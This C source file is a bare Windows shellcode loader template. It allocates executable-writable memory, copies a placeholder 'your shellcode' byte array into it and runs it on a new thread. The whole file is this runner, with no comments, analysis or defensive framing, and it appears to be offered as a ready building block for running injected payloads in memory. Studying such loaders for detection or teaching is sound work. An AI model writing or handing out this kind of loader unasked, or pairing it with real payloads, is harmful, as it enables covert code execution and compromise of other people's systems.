#include <windows.h>
#include <stdio.h>

unsigned char shellcode[] = "your shellcode";

int main() {
    void *exec_mem = VirtualAlloc(0, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        perror("VirtualAlloc failed");
        return -1;
    }
    memcpy(exec_mem, shellcode, sizeof(shellcode));
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_mem, NULL, 0, NULL);
    if (hThread == NULL) {
        perror("CreateThread failed");
        VirtualFree(exec_mem, 0, MEM_RELEASE);
        return -1;
    }
    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    return 0;
}